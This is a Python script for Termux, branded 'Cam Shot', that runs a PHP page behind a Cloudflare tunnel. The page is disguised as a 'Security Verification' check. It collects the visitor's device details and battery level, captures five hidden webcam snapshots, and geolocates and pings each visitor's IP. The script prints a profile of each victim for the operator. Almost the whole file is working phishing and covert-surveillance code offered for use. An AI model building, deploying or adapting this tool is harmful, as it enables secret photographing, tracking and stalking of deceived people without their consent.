import os
import socket
import subprocess
import shutil
import threading
import time
import sys
import re
import json
from urllib.request import urlopen

def setup_requirements():
    """Scan Library and Install via APT/PKG in Termux"""

    required_libs = ["requests"] 
    for lib in required_libs:
        try:
            __import__(lib)
        except ImportError:
            print(f"\033[93m[*] Installing {lib} via pip...\033[0m")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
    if shutil.which("php") is None:
        print("\033[93m[*] PHP not found. Installing via apt...\033[0m")
        os.system("apt update && apt install php -y")
    else:
        print("\033[92m[+] PHP is already installed.\033[0m")
    if shutil.which("cloudflared") is None:
        print("\033[93m[*] Cloudflared not found. Installing via apt...\033[0m")
        os.system("apt update && apt install cloudflared -y")
        if shutil.which("cloudflared") is None:
            print("\033[91m[!] Failed to install via apt. Trying manual download...\033[0m")
            arch = subprocess.check_output("uname -m", shell=True).decode().strip()
            if "aarch64" in arch:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-android-arm64"
            else:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
            
            os.system(f"curl -L {url} -o cloudflared")
            os.system("chmod +x cloudflared")
            os.system("mv cloudflared /data/data/com.termux/files/usr/bin/")
    else:
        print("\033[92m[+] Cloudflared is already installed.\033[0m")

    print("\033[92m[+] All requirements are satisfied!\033[0m")

G = "\033[92m"  ## أخضر
R = "\033[91m"  ## أحمر
C = "\033[96m"  ## سماوي
Y = "\033[93m"  ## أصفر
M = "\033[95m"  ## أرجواني
W = "\033[0m"   ## إعادة ضبط
CLR = "\033[K"  ## مسح بقية السطر

BASE_DIR = os.getcwd()
WEB_DIR = os.path.join(BASE_DIR, "web")
PHOTO_DIR = os.path.join(WEB_DIR, "photos")
LOG_FILE = os.path.join(WEB_DIR, "visits.log")
stop_spinner = threading.Event()

def get_ping(ip):
    try:
        cmd = ["ping", "-c", "1", "-W", "1", ip] if sys.platform != "win32" else ["ping", "-n", "1", "-w", "1000", ip]
        start = time.time()
        res = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        end = time.time()
        return f"{int((end - start) * 1000)}ms" if res.returncode == 0 else "N/A"
    except: return "N/A"

def get_detailed_location(ip):
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,proxy,timezone"
        data = json.loads(urlopen(url).read().decode())
        if data['status'] == 'success':
            p_status = f"{R}[VPN/Proxy]{W}" if data.get('proxy') else f"{G}[Direct]{W}"
            return {"loc": f"{data['country']}, {data['city']}", "isp": data['isp'], "proxy": p_status, "tz": data['timezone']}
    except: pass
    return {"loc": "Unknown", "isp": "Unknown", "proxy": "[?]", "tz": "Unknown"}

def create_web_files():
    os.makedirs(WEB_DIR, exist_ok=True)
    os.makedirs(PHOTO_DIR, exist_ok=True)
    
    php_content = """<?php
$ip = $_SERVER["HTTP_CF_CONNECTING_IP"] ?? $_SERVER['REMOTE_ADDR'];
if (isset($_POST['imageData'])) {
    $data = str_replace(['data:image/jpeg;base64,', ' '], ['', '+'], $_POST['imageData']);
    $name = $_POST['name'] ?? 'snap';
    file_put_contents("photos/{$ip}_{$name}_".time().".jpg", base64_decode($data));
    exit;
}
if (isset($_POST['specs'])) {
    file_put_contents("visits.log", $ip . "|" . date("H:i:s") . "|" . $_POST['specs'] . "\\n", FILE_APPEND);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Security Verification</title>
<style>
    body { background-color: #f4f7f9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; max-width: 400px; width: 90%; }
</style>
</head>
<body>
    <div class="container">
        <h2>Verifying...</h2>
        <video id="v" style="display:none" autoplay></video>
        <canvas id="c" style="display:none"></canvas>
    </div>
    <script>
        async function sendInfo() {
            let b = await navigator.getBattery();
            let info = navigator.userAgent + "|" + screen.width + "x" + screen.height + "|" + (navigator.deviceMemory || 'N/A') + "GB RAM|" + Math.round(b.level * 100) + "%";
            fetch('', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'specs=' + encodeURIComponent(info)});
        }
        async function start() {
            await sendInfo();
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video:true});
                document.getElementById('v').srcObject = stream;
                for(let i=1; i<=5; i++) { await new Promise(r => setTimeout(r, 1500)); capture(i); }
            } catch(e) {}
        }
        function capture(n) {
            const v = document.getElementById('v'), c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            fetch('', {method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'imageData=' + encodeURIComponent(c.toDataURL('image/jpeg')) + '&name=snap' + n
            });
        }
        window.onload = start;
    </script>
</body>
</html>"""
    with open(os.path.join(WEB_DIR, "index.php"), "w") as f: f.write(php_content)
    if not os.path.exists(LOG_FILE): open(LOG_FILE, "a").close()

def run_spinner():
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    i = 0
    while not stop_spinner.is_set():
        sys.stdout.write(f"\r{C}[{chars[i]}] Negotiating with Cloudflare...{W}")
        sys.stdout.flush()
        i = (i + 1) % len(chars)
        time.sleep(0.1)

def start_services():
    port = 8080
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(("127.0.0.1", port)) != 0: break
            port += 1
    php_p = subprocess.Popen(["php", "-S", f"127.0.0.1:{port}", "-t", WEB_DIR], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    t = threading.Thread(target=run_spinner); t.start()
    cf_cmd = "cloudflared" if shutil.which("cloudflared") else "./cloudflared"
    cf_p = subprocess.Popen([cf_cmd, "tunnel", "--url", f"http://127.0.0.1:{port}"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    url = None
    for line in cf_p.stdout:
        m = re.search(r"https://[-\w]+\.trycloudflare\.com", line)
        if m:
            url = m.group(0)
            stop_spinner.set(); t.join()
            print(f"\r{G}✅ TUNNEL ESTABLISHED !{CLR}{W}")
            print(f"{Y}🔗 URL: {W}{C}{url}{W}\n" + "="*35)
            break
    return php_p, cf_p

def monitor():
    last_line = ""
    print(f"{C}[*] Tracking active...{W}\n")
    while True:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                lines = f.readlines()
                if lines:
                    current_line = lines[-1].strip()
                    if current_line != last_line:
                        last_line = current_line
                        try:
                            parts = current_line.split("|")
                            ip, ts, ua, res, ram, bat = parts[0], parts[1], parts[2], parts[3], parts[4], parts[5]
                            
                            info = get_detailed_location(ip)
                            ping_val = get_ping(ip)
                            imgs = sorted([p for p in os.listdir(PHOTO_DIR) if p.startswith(ip)])
                            
                            print(f"\n{M}[ NEW VISIT DETECTED ]{W}")
                            print(f"{G}🌐 IP     : {W}{ip:<15} {info['proxy']}")
                            print(f"{G}📶 PING   : {Y}{ping_val}{W}")
                            print(f"{G}📍 LOC    : {W}{info['loc']}")
                            print(f"{G}📡 ISP    : {W}{info['isp']}")
                            print(f"{G}🔋 BAT    : {W}{bat} | {ram} | {res}")
                            print(f"{G}📸 SNAPS  : {Y}{len(imgs)} Images Captured{W}")
                            print(f"{G}📂 PATH   : {M}{PHOTO_DIR}/{imgs[-1] if imgs else 'None'}{W}")
                            print(f"{G}⏰ TIME   : {W}{ts} ({info['tz']})")
                            print(f"{G}📱 DEVICE : {W}{ua[:50]}...")
                            print(f"{M}" + "-"*35 + f"{W}")
                        except: pass
        time.sleep(1)

def show_art():
    art = f"""{C} 
  ▗▄▄▖ ▗▄▖ ▗▖  ▗▖           
▐▌   ▐▌ ▐▌▐▛▚▞▜▌           
▐▌   ▐▛▀▜▌▐▌  ▐▌           
▝▚▄▄▖▐▌ ▐▌▐▌  ▐▌           
                                                                              
         ▗▄▄▖▗▖ ▗▖ ▗▄▖▗▄▄▄▖
        ▐▌   ▐▌ ▐▌▐▌ ▐▌ █  
         ▝▀▚▖▐▛▀▜▌▐▌ ▐▌ █  
        ▗▄▄▞▘▐▌ ▐▌▝▚▄▞▘ █  v1.0
                           
{G}    [+] Enhanced Multi-Tracker & Snapper [+]
{Y}         [ Created By BayLak ]
{W}"""
    print(art)

def main():
    try:
        os.system('clear || cls'); show_art()
        create_web_files()
        p1, p2 = start_services()
        monitor()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopping...{W}")
        stop_spinner.set()
        subprocess.run(["pkill", "-f", "php"], stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "-f", "cloudflared"], stderr=subprocess.DEVNULL)
        sys.exit()

if __name__ == "__main__":
    main()
